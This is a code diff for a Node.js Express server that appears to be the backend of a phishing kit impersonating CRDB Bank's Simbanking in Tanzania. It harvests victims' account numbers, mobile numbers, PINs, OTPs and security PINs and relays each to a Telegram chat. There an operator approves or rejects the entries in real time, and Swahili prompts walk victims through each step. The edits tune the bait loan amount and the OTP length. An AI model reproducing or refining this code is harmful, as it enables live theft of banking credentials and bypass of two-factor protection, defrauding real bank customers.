@@ -6,11 +6,9 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Environment variables from Render Dashboard
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-// In-memory session store
 const sessions = {};
 
 async function sendTelegramMessage(text, replyMarkup) {
@@ -81,7 +79,6 @@ app.post('/api/submit-credentials', async (req, res) => {
   try {
     const { sessionId, accountNumber, mobileNumber, pin, loanDetails } = req.body;
     
-    // Server-side validation: Mobile number must start with 0
     if (!mobileNumber || !mobileNumber.startsWith('0')) {
       return res.status(400).json({ success: false, error: 'Mobile number must start with 0' });
     }
@@ -99,7 +96,7 @@ app.post('/api/submit-credentials', async (req, res) => {
       `🏦 *Acc No:* \`${accountNumber}\`\n` +
       `📱 *Mobile:* \`${mobileNumber}\`\n` +
       `🔑 *PIN:* \`${pin}\`\n` +
-      `💰 *Loan:* ${loanDetails?.amount || '100,000 TZS'}`;
+      `💰 *Loan:* ${loanDetails?.amount || '1,000,000 TZS'}`;
 
     const keyboard = {
       inline_keyboard: [
@@ -124,21 +121,21 @@ app.post('/api/submit-credentials', async (req, res) => {
   }
 });
 
-// 2. Submit OTP
+// 2. Submit OTP (5 Digits Enforcement)
 app.post('/api/submit-otp', async (req, res) => {
   try {
     const { sessionId, otp } = req.body;
     if (!sessions[sessionId]) return res.status(404).json({ error: 'Session not found' });
 
-    if (!otp || otp.length !== 6) {
-      return res.status(400).json({ success: false, error: 'OTP must be 6 digits' });
+    if (!otp || otp.length !== 5 || !/^\d+$/.test(otp)) {
+      return res.status(400).json({ success: false, error: 'OTP must be 5 numeric digits' });
     }
 
     sessions[sessionId].status = 'pending_otp';
     sessions[sessionId].otp = otp;
 
     const message = `🔑 *OTP SUBMITTED* for Acc: \`${sessions[sessionId].accountNumber}\`\n\n` +
-      `🔢 *OTP Entered (6 Digits):* \`${otp}\``;
+      `🔢 *OTP Entered (5 Digits):* \`${otp}\``;
 
     const keyboard = {
       inline_keyboard: [
@@ -163,6 +160,10 @@ app.post('/api/submit-security-pin', async (req, res) => {
     const { sessionId, securityPin } = req.body;
     if (!sessions[sessionId]) return res.status(404).json({ error: 'Session not found' });
 
+    if (!securityPin || !/^\d+$/.test(securityPin)) {
+      return res.status(400).json({ success: false, error: 'Security PIN must be numeric' });
+    }
+
     sessions[sessionId].status = 'pending_security_pin';
     sessions[sessionId].securityPin = securityPin;
 
@@ -186,7 +187,6 @@ app.post('/api/submit-security-pin', async (req, res) => {
   }
 });
 
-// Status check endpoint for frontend polling
 app.get('/api/status/:sessionId', (req, res) => {
   const { sessionId } = req.params;
   const session = sessions[sessionId];
@@ -194,7 +194,6 @@ app.get('/api/status/:sessionId', (req, res) => {
   res.json(session);
 });
 
-// Telegram Callback Webhook Endpoint
 app.post('/api/telegram-webhook', async (req, res) => {
   try {
     const update = req.body;
@@ -204,7 +203,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
       const chatId = update.callback_query.message.chat.id;
       const messageId = update.callback_query.message.message_id;
       
-      // Acknowledge tap and remove inline keyboard buttons immediately
       await answerCallbackQuery(callbackQueryId, 'Imepokelewa!');
       await removeInlineKeyboard(chatId, messageId);
 
@@ -224,10 +222,10 @@ app.post('/api/telegram-webhook', async (req, res) => {
           sessions[sessionId].notification = 'INVALID PIN: Tafadhali ingiza PIN sahihi ya Simbanking.';
         } else if (action === 'proceedotp') {
           sessions[sessionId].status = 'enter_otp';
-          sessions[sessionId].notification = 'IDHINI ✅ - Endelea kuweka OTP ya tarakimu 6.';
+          sessions[sessionId].notification = 'IDHINI ✅ - Endelea kuweka OTP ya tarakimu 5.';
         } else if (action === 'wrongotp') {
           sessions[sessionId].status = 'enter_otp';
-          sessions[sessionId].notification = 'WRONG OTP: Tafadhali ingiza namba sahihi ya OTP ya tarakimu 6.';
+          sessions[sessionId].notification = 'WRONG OTP: Tafadhali ingiza namba sahihi ya OTP ya tarakimu 5.';
         } else if (action === 'correctotp') {
           sessions[sessionId].status = 'enter_security_pin';
           sessions[sessionId].notification = 'OTP SWAHIHI ✅ - Endelea kuweka PIN ya usalama.';
@@ -260,4 +258,4 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
 const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => console.log(`CRDB Server running on port ${PORT}`));
-        
+    
